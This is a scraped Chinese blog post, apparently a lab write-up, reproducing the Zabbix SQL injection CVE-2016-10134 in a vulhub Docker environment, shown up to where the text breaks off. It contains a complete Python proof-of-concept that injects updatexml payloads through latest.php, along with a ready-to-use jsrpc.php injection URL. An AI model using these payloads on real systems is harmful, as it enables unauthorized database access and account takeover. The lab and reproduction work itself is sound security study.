{"blogid": "126332025", "writerAge": "ç é¾„2å¹´", "writerBlogNum": "173", "writerCollect": "3208", "writerComment": "2316", "writerFan": "18533", "writerGrade": "6çº§", "writerIntegral": "7076", "writerName": "_PowerShell", "writerProfileAdress": "writer_image\\profile_126332025.jpg", "writerRankTotal": "1894", "writerRankWeekly": "57", "writerThumb": "2043", "writerVisitNum": "363921", "blog_read_count": "828", "blog_time": "å·²äºÂ 2022-08-14 16:16:10Â ä¿®æ”¹", "blog_title": "[ vulhubæ¼æ´å¤ç°ç¯‡ ] zabbix SQLæ³¨å…¥æ¼æ´ ï¼ˆCVE-2016-10134ï¼‰", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<blockquote>\n<h1><a id=\"__0\"></a>ğŸ¬ åšä¸»ä»‹ç»</h1>\n<p>ğŸ‘¨â€ğŸ“ åšä¸»ä»‹ç»ï¼šå¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ <a href=\"https://blog.csdn.net/qq_51577576\">_PowerShell</a> ï¼Œå¾ˆé«˜å…´è®¤è¯†å¤§å®¶~<br/> âœ¨ä¸»æ”»é¢†åŸŸï¼šã€æ¸—é€é¢†åŸŸã€‘ã€æ•°æ®é€šä¿¡ã€‘ ã€é€šè®¯å®‰å…¨ã€‘ ã€webå®‰å…¨ã€‘ã€é¢è¯•åˆ†æã€‘<br/> ğŸ‰ç‚¹èµâ•è¯„è®ºâ•æ”¶è— == å…»æˆä¹ æƒ¯ï¼ˆä¸€é”®ä¸‰è¿ï¼‰ğŸ˜‹<br/> ğŸ‰æ¬¢è¿å…³æ³¨ğŸ’—ä¸€èµ·å­¦ä¹ ğŸ‘ä¸€èµ·è®¨è®ºâ­ï¸ä¸€èµ·è¿›æ­¥ğŸ“æ–‡æœ«æœ‰å½©è›‹<br/> ğŸ™ä½œè€…æ°´å¹³æœ‰é™ï¼Œæ¬¢è¿å„ä½å¤§ä½¬æŒ‡ç‚¹ï¼Œç›¸äº’å­¦ä¹ è¿›æ­¥ï¼</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>æ–‡ç« ç›®å½•</h3>\n<ul><li><a href=\"#__0\">ğŸ¬ åšä¸»ä»‹ç»</a></li><li><a href=\"#_8\">ä¸€ã€æ¼æ´æè¿°:</a></li><li><a href=\"#_10\">äºŒã€å—å½±å“ç‰ˆæœ¬ï¼š</a></li><li><a href=\"#Zabbix_15\">ä¸‰ã€ZabbixæŒ‡çº¹ä¿¡æ¯</a></li><li><a href=\"#_42\">å››ã€åŸºæœ¬åŸç†ï¼š</a></li><li><a href=\"#_47\">äº”ã€ç¯å¢ƒæ­å»º</a></li><li><a href=\"#_78\">å…­ã€æ¼æ´å¤ç°ï¼š</a></li><li><ul><li><a href=\"#1_jsrpcphp_79\">1. jsrpc.php</a></li><li><a href=\"#2_latestphp_81\">2. latest.php</a></li><li><a href=\"#3POC_83\">3.POCéªŒè¯</a></li><li><a href=\"#4POC_93\">4.POC</a></li></ul>\n</li><li><a href=\"#xray_192\">ä¸ƒã€x-rayæ¸—é€</a></li><li><ul><li><a href=\"#1Xray_193\">1.ä½¿ç”¨X-rayç›‘å¬</a></li><li><a href=\"#2_206\">2.æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆæœåŠ¡å™¨æŠ¥é”™ä¿¡æ¯æ³„éœ²ï¼‰</a></li><li><ul><li><a href=\"#_212\">ç›´æ¥è®¿é—®æ‰€ç»™é“¾æ¥</a></li></ul>\n</li><li><a href=\"#3CVE201610134_223\">3.CVE-2016-10134</a></li><li><ul><li><a href=\"#links_230\">æŸ¥çœ‹linksï¼ˆå‚è€ƒé“¾æ¥ï¼‰</a></li><li><a href=\"#1latestphp_236\">å¤ç°1ï¼ˆlatest.phpï¼‰</a></li><li><ul><li><a href=\"#guest_237\">ç”¨guestè´¦å·ï¼ˆå¯†ç ä¸ºç©ºï¼‰ç™»å½•æ¸¸å®¢è´¦æˆ·</a></li><li><a href=\"#Cookiezbx_sessionid16_244\">å¤åˆ¶Cookieä¸­zbx_sessionidå16å­—èŠ‚</a></li><li><a href=\"#sid_248\">å¡«å……sidçš„å€¼ï¼Œå¯æˆåŠŸæ³¨å…¥</a></li><li><ul><li><a href=\"#_250\">æŸ¥è¯¢æ•°æ®åº“å½“å‰ç”¨æˆ·ä¿¡æ¯</a></li><li><a href=\"#_258\">æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</a></li><li><a href=\"#Sqlmap_265\">Sqlmapè‡ªåŠ¨åŒ–æ³¨å…¥</a></li></ul>\n</li></ul>\n</li><li><a href=\"#2jsrpcphp_280\">å¤ç°2ï¼ˆjsrpc.phpï¼‰</a></li><li><ul><li><a href=\"#_282\">æŸ¥è¯¢å½“å‰ä½¿ç”¨ç”¨æˆ·</a></li><li><a href=\"#_288\">æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬</a></li></ul>\n</li></ul>\n</li><li><a href=\"#4Zabbix_42__Authentication_Bypass_294\">4.Zabbix 4.2 - Authentication Bypassç™»å½•ç»•è¿‡</a></li><li><ul><li><a href=\"#links_301\">å‚çœ‹linksï¼ˆå‚è€ƒé“¾æ¥ï¼‰</a></li><li><a href=\"#POC_305\">ä½¿ç”¨POCç»•è¿‡ç™»å½•</a></li></ul>\n</li><li><a href=\"#5_312\">5.å­˜åœ¨é»˜è®¤å¯†ç </a></li><li><ul><li><a href=\"#links_319\">æŸ¥çœ‹linksï¼ˆå‚è€ƒé“¾æ¥ï¼‰</a></li><li><a href=\"#_327\">ä½¿ç”¨é»˜è®¤è´¦å·å¯†ç ï¼Œç™»é™†æˆåŠŸ</a></li></ul>\n</li><li><a href=\"#6_336\">6.æš´åŠ›ç ´è§£æ¼æ´</a></li></ul>\n</li><li><a href=\"#getshell_348\">å…«ã€getshell</a></li><li><ul><li><a href=\"#1_349\">1.ç¯å¢ƒ</a></li><li><a href=\"#2_352\">2.åœ¨é¶æœºä¸Šå†™å…¥è„šæœ¬</a></li><li><a href=\"#3_361\">3.æ”»å‡»æœºç›‘å¬ï¼š</a></li><li><a href=\"#4_364\">4.é¶æœºè¿æ¥</a></li><li><a href=\"#5Getshell_371\">5.Getshellå¤±è´¥</a></li></ul>\n</li><li><a href=\"#_376\">ä¹ã€æ¼æ´ä¿®å¤ï¼š</a></li><li><a href=\"#_380\">åã€ç›¸åº”èµ„æº</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"_8\"></a>ä¸€ã€æ¼æ´æè¿°:</h1>\n<blockquote>\n<p>zabbixæ˜¯ä¸€ä¸ªåŸºäºWEBç•Œé¢çš„æä¾›åˆ†å¸ƒå¼ç³»ç»Ÿç›‘è§†ä»¥åŠç½‘ç»œç›‘è§†åŠŸèƒ½çš„ä¼ä¸šçº§çš„å¼€æºè§£å†³æ–¹æ¡ˆã€‚Zabbix çš„latest.phpä¸­çš„toggle_ids[]æˆ–jsrpc.phpç§çš„profieldx2å‚æ•°å­˜åœ¨sqlæ³¨å…¥ï¼Œé€šè¿‡sqlæ³¨å…¥è·å–ç®¡ç†å‘˜è´¦æˆ·å¯†ç ï¼Œè¿›å…¥åå°ï¼Œè¿›è¡Œgetshellæ“ä½œã€‚</p>\n</blockquote>\n<h1><a id=\"_10\"></a>äºŒã€å—å½±å“ç‰ˆæœ¬ï¼š</h1>\n<pre><code class=\"prism language-bash\"><span class=\"token number\">2.2</span>.x\n<span class=\"token number\">3.3</span>.0-3.03\n</code></pre>\n<h1><a id=\"Zabbix_15\"></a>ä¸‰ã€ZabbixæŒ‡çº¹ä¿¡æ¯</h1>\n<pre><code class=\"prism language-bash\"> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"body_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"images/general/zabbix.ico\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>,\n        <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"header_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"zbx_sessionid\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>,\n        <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"body_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"meta name=<span class=\"token entity\" title='\\\"'>\\\"</span>author<span class=\"token entity\" title='\\\"'>\\\"</span> content=<span class=\"token entity\" title='\\\"'>\\\"</span>zabbix sia<span class=\"token entity\" title='\\\"'>\\\"</span>\"</span>\n        <span class=\"token punctuation\">}</span>,\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"banner_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"linux zabbix-\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>,\n        <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"banner_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"zbx_sessionid\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<h1><a id=\"_42\"></a>å››ã€åŸºæœ¬åŸç†ï¼š</h1>\n<blockquote>\n<p>sqlæ³¨å…¥ï¼šç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡å¯»æ‰¾æ³¨å…¥ç‚¹ï¼Œè¿›è¡Œsqlè¯­å¥æ‹¼æ¥ï¼Œæ¬ºéª—æœåŠ¡å™¨ï¼Œè·å–æƒ³è¦çš„æ•°æ®ã€‚<br/> zabbix:ç”±ä¸¤éƒ¨åˆ†æ„æˆï¼Œzabbix serverä¸å¯é€‰ç»„ä»¶zabbix agentã€‚<br/> zabbix serverå¯ä»¥é€šè¿‡SNMPï¼Œzabbix agentï¼Œpingï¼Œç«¯å£ç›‘è§†ç­‰æ–¹æ³•æä¾›å¯¹è¿œç¨‹æœåŠ¡å™¨/ç½‘ç»œçŠ¶æ€çš„ç›‘è§†ï¼Œæ•°æ®æ”¶é›†ç­‰åŠŸèƒ½ã€‚<br/> zabbix agentéœ€è¦å®‰è£…åœ¨è¢«ç›‘è§†çš„ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œå®ƒä¸»è¦å®Œæˆå¯¹ç¡¬ä»¶ä¿¡æ¯æˆ–ä¸æ“ä½œç³»ç»Ÿæœ‰å…³çš„å†…å­˜ï¼ŒCPUç­‰ä¿¡æ¯çš„æ”¶é›†</p>\n</blockquote>\n<h1><a id=\"_47\"></a>äº”ã€ç¯å¢ƒæ­å»º</h1>\n<p><a href=\"https://blog.csdn.net/qq_51577576/article/details/125048165\">vluhubæ¼æ´é¶åœºæ­å»º</a></p>\n<blockquote>\n<p>vulhubç¯å¢ƒæ˜¯ï¼šZabbix 3.0.3<br/> åˆ‡åˆ°CVE-2016-10134æ¼æ´ç›®å½•ä¸‹</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token builtin class-name\">cd</span> vulhub/zabbix/CVE-2016-10134 \n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\ab4951d183aa41efb627373ad4415fd2.png\"/></p>\n<blockquote>\n<p>åˆ›å»ºCVE-2016-10134ç¯å¢ƒ</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> up -d\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\b03b4efc618c429aaba7040baa647be2.png\"/></p>\n<blockquote>\n<p>æŸ¥çœ‹CVE-2016-10134ç¯å¢ƒ</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> <span class=\"token function\">ps</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\cb23e434715443eb9964b804abf06168.png\"/></p>\n<blockquote>\n<p>è®¿é—®CVE-2016-10134ç¯å¢ƒ</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">http://ip:8080\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\8b2c5c3017c44e6482ebd61cf882a9dc.png\"/><br/> å¤ç°ç©è®°å¾—å…³é—­ç¯å¢ƒï¼š</p>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> down\n</code></pre>\n<h1><a id=\"_78\"></a>å…­ã€æ¼æ´å¤ç°ï¼š</h1>\n<h2><a id=\"1_jsrpcphp_79\"></a>1. jsrpc.php</h2>\n<p>ï¼ˆçœ‹ä¸‹æ–‡X-rayâ€“&gt;CVE-2016-10134-å¤ç°2ï¼‰</p>\n<h2><a id=\"2_latestphp_81\"></a>2. latest.php</h2>\n<p>ï¼ˆçœ‹ä¸‹æ–‡X-rayâ€“&gt;CVE-2016-10134-å¤ç°1ï¼‰</p>\n<h2><a id=\"3POC_83\"></a>3.POCéªŒè¯</h2>\n<blockquote>\n<p>ä¸‹é¢ä¸¤æ¡å‘½ä»¤éƒ½å¯ä»¥ä½¿ç”¨</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">python3 CVE-2016-10134.py -t <span class=\"token number\">127.0</span>.0.1:8080\npython3 CVE-2016-10134.py --target <span class=\"token number\">127.0</span>.0.1:8080\n</code></pre>\n<blockquote>\n<p>å­˜åœ¨æ¼æ´<br/> ç›´æ¥å¾—åˆ°äº†å½“å‰ç”¨æˆ·<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\be3f94e382fb494f92b076053bf01990.png\"/></p>\n</blockquote>\n<h2><a id=\"4POC_93\"></a>4.POC</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token comment\"># @Time    : 2021/12/23</span>\n<span class=\"token comment\"># @Author  : TesterCC</span>\n\n<span class=\"token function\">import</span> json\n\nfrom optparse <span class=\"token function\">import</span> OptionParser\n\n<span class=\"token function\">import</span> re\n<span class=\"token function\">import</span> sys\n\nfrom requests <span class=\"token function\">import</span> session\n\n<span class=\"token comment\"># initialization</span>\nret <span class=\"token operator\">=</span> dict<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">'status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> str<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> list<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nss <span class=\"token operator\">=</span> session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nss.headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'Accept'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'*/*'</span>, <span class=\"token string\">'Accept-Encoding'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'gzip, deflate'</span>,\n              <span class=\"token string\">'User-Agent'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'</span><span class=\"token punctuation\">}</span>\n\n\n<span class=\"token comment\"># CVE-2016-10134  # python3 CVE-2016-10134.py --target 127.0.0.1:8080</span>\n\ndef get_payload1<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span> -<span class=\"token operator\">&gt;</span> str:\n    payload <span class=\"token operator\">=</span> re.search<span class=\"token punctuation\">(</span>r<span class=\"token string\">\"\\[(.*\\))\\]\"</span>, text<span class=\"token punctuation\">)</span>\n    <span class=\"token builtin class-name\">return</span> payload.group<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n\ndef get_sql_injection_info<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span> -<span class=\"token operator\">&gt;</span> str:\n    sql_injection_info <span class=\"token operator\">=</span> re.search<span class=\"token punctuation\">(</span>r<span class=\"token string\">\"&lt;\\/li&gt;&lt;li&gt;(.*)\\'\\]\"</span>, text<span class=\"token punctuation\">)</span>\n    <span class=\"token builtin class-name\">return</span> sql_injection_info.group<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n\ndef attack<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>:\n    <span class=\"token string\">''</span>'login zabbix<span class=\"token string\">''</span>'\n    login_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://{}/index.php\"</span>.format<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\n\n    ret0 <span class=\"token operator\">=</span> ss.get<span class=\"token punctuation\">(</span>login_url<span class=\"token punctuation\">)</span>\n\n    cookie_dict <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span>i.name: i.value <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">i</span> <span class=\"token keyword\">in</span> ret0.cookies<span class=\"token punctuation\">}</span>\n    <span class=\"token comment\"># get sid</span>\n    sid <span class=\"token operator\">=</span> cookie_dict.get<span class=\"token punctuation\">(</span><span class=\"token string\">'zbx_sessionid'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">16</span>:<span class=\"token punctuation\">]</span>\n\n    data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"sid\"</span><span class=\"token builtin class-name\">:</span> sid,\n            <span class=\"token string\">\"form_refresh\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"1\"</span>,\n            <span class=\"token string\">\"name\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"\"</span>,\n            <span class=\"token string\">\"passwrd\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"\"</span>,\n            <span class=\"token string\">\"enter\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"Sign+in\"</span><span class=\"token punctuation\">}</span>\n\n    retn <span class=\"token operator\">=</span> ss.post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>login_url, <span class=\"token assign-left variable\">headers</span><span class=\"token operator\">=</span>ss.headers, <span class=\"token assign-left variable\">data</span><span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> retn.status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span>:\n        <span class=\"token comment\"># updatexml(0,concat(0xa,database()),0)</span>\n        <span class=\"token comment\"># updatexml(0,concat(0xa,version()),0)</span>\n        payload1 <span class=\"token operator\">=</span> f<span class=\"token string\">\"http://{target}/latest.php?output=ajax&amp;sid={sid}&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)\"</span>\n\n        retn2 <span class=\"token operator\">=</span> ss.get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>payload1, <span class=\"token assign-left variable\">headers</span><span class=\"token operator\">=</span>ss.headers<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> retn2.status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span>:\n            resp <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token string\">\"payload\"</span><span class=\"token builtin class-name\">:</span> get_payload1<span class=\"token punctuation\">(</span>retn2.text<span class=\"token punctuation\">)</span>,\n                <span class=\"token string\">\"info\"</span><span class=\"token builtin class-name\">:</span> get_sql_injection_info<span class=\"token punctuation\">(</span>retn2.text<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n\n            ret<span class=\"token punctuation\">[</span><span class=\"token string\">'status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'success'</span>\n            ret<span class=\"token punctuation\">[</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> resp\n\n    <span class=\"token builtin class-name\">return</span> ret\n\n\ndef main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>:\n    usage <span class=\"token operator\">=</span> <span class=\"token string\">\"Usage: python3 CVE-2016-10134.py --target &lt;target ip:port&gt;\"</span>\n    parse <span class=\"token operator\">=</span> OptionParser<span class=\"token punctuation\">(</span>usage<span class=\"token operator\">=</span>usage<span class=\"token punctuation\">)</span>\n    parse.add_option<span class=\"token punctuation\">(</span><span class=\"token string\">\"-t\"</span>, <span class=\"token string\">'--target'</span>, <span class=\"token assign-left variable\">type</span><span class=\"token operator\">=</span><span class=\"token string\">\"string\"</span>, <span class=\"token assign-left variable\">dest</span><span class=\"token operator\">=</span><span class=\"token string\">\"target\"</span>, <span class=\"token assign-left variable\">help</span><span class=\"token operator\">=</span><span class=\"token string\">\"server ip:port, e.g. 127.0.0.1:8080\"</span><span class=\"token punctuation\">)</span>\n\n    options, args <span class=\"token operator\">=</span> parse.parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> not options.target:\n        ret<span class=\"token punctuation\">[</span><span class=\"token string\">'status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'fail'</span>\n        ret<span class=\"token punctuation\">[</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"target empty\"</span>\n        print<span class=\"token punctuation\">(</span>usage<span class=\"token punctuation\">)</span>\n        sys.exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    else:\n        target <span class=\"token operator\">=</span> options.target\n\n    try:\n        attack<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\n    except Exception:\n        ret<span class=\"token punctuation\">[</span><span class=\"token string\">'status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'fail'</span>\n\n    print<span class=\"token punctuation\">(</span>json.dumps<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">))</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token builtin class-name\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h1><a id=\"xray_192\"></a>ä¸ƒã€x-rayæ¸—é€</h1>\n<h2><a id=\"1Xray_193\"></a>1.ä½¿ç”¨X-rayç›‘å¬</h2>\n<blockquote>\n<p>Xrayç›‘å¬</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">.<span class=\"token punctuation\">\\</span>xray_ windows_ and64. exe webscan -listen <span class=\"token number\">127.0</span>. <span class=\"token number\">0.1</span> :8888\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\78d06bf9ea8d4d82a823ca75c3849f57.png\"/></p>\n<blockquote>\n<p>ç«ç‹å¼€å¯ä»£ç†ï¼Œä¸x-rayç›‘å¬çš„ç«¯å£ç›¸å¯¹åº”<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\d9468114958a475695df680856e94725.png\"/></p>\n</blockquote>\n<blockquote>\n<p>è®¿é—®ç½‘ç«™http://192.168.13.131:8080<br/> Xrayå°±å¼€å§‹æœ‰äº§å‡ºäº†ï¼Œäº§å‡ºæˆ‘å°±ä¸æˆªå›¾äº†ã€‚<br/> æˆ‘æŠŠäº§å‡ºä¿¡æ¯copyåˆ°äº†ä¸‹é¢è¿›è¡Œåˆ†æ</p>\n</blockquote>\n<h2><a id=\"2_206\"></a>2.æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ˆæœåŠ¡å™¨æŠ¥é”™ä¿¡æ¯æ³„éœ²ï¼‰</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: baseline<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,md5(2072517078)),0)\"</span>\nVulnType         <span class=\"token string\">\"sensitive/server-error\"</span>\n</code></pre>\n<h3><a id=\"_212\"></a>ç›´æ¥è®¿é—®æ‰€ç»™é“¾æ¥</h3>\n<blockquote>\n<p>è¿™æ¡ä¿¡æ¯å…¶å®å°±æ˜¯åˆ©ç”¨çš„CVE-2016-10134æ³¨å…¥æ¥¼çš„é‚£ä¸ª</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/jsrpc.php?type<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">mode</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">method</span><span class=\"token operator\">=</span>screen.get<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx</span><span class=\"token operator\">=</span>web.item.graph<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">resourcetype</span><span class=\"token operator\">=</span><span class=\"token number\">17</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx2</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>,concat<span class=\"token punctuation\">(</span>0xa,md5<span class=\"token punctuation\">(</span><span class=\"token number\">2072517078</span><span class=\"token punctuation\">))</span>,0<span class=\"token punctuation\">)</span>\n</code></pre>\n<p>è¿™å¥è¯å°±æ˜¯MD5åŠ å¯†2072517078ï¼Œè¾“å‡ºåªæœ‰31ä½ï¼Œupdatexmlå¯ä»¥è¾“å‡º32ä¸ºï¼Œä½†æ˜¯å‰é¢å¨¶äº†ä¸€ä¸ªè¿æ¥ç¬¦æ‰€ä»¥åªè¾“å‡ºäº†31ä½<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\4a16eed8d5544d5da32a589e646e9519.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\2c7ae761b6a44c7b90773f3d16867f1d.png\"/></p>\n<h2><a id=\"3CVE201610134_223\"></a>3.CVE-2016-10134</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: phantasm<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/\"</span>\nVulnType         <span class=\"token string\">\"poc-yaml-zabbix-cve-2016-10134-sqli/default\"</span>\nlinks            <span class=\"token punctuation\">[</span><span class=\"token string\">\"https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134\"</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<h3><a id=\"links_230\"></a>æŸ¥çœ‹linksï¼ˆå‚è€ƒé“¾æ¥ï¼‰</h3>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\c917a020037c4316929a43e7fba1c871.png\"/></p>\n<blockquote>\n<p>å‘ç°æ˜¯ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´</p>\n</blockquote>\n<h3><a id=\"1latestphp_236\"></a>å¤ç°1ï¼ˆlatest.phpï¼‰</h3>\n<h4><a id=\"guest_237\"></a>ç”¨guestè´¦å·ï¼ˆå¯†ç ä¸ºç©ºï¼‰ç™»å½•æ¸¸å®¢è´¦æˆ·</h4>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\6ecea4d017544d22b22a229d640de6bb.png\"/></p>\n<blockquote>\n<p>å‘ç°ç™»å½•æˆåŠŸ</p>\n</blockquote>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\03307daf348c457e99ce1139b5141aea.png\"/></p>\n<h4><a id=\"Cookiezbx_sessionid16_244\"></a>å¤åˆ¶Cookieä¸­zbx_sessionidå16å­—èŠ‚</h4>\n<blockquote>\n<p>ç™»å½•åï¼ŒæŸ¥çœ‹Cookieä¸­çš„zbx_sessionidï¼Œå¤åˆ¶å16ä½å­—ç¬¦ï¼š916444579b8e84f1<br/> <img 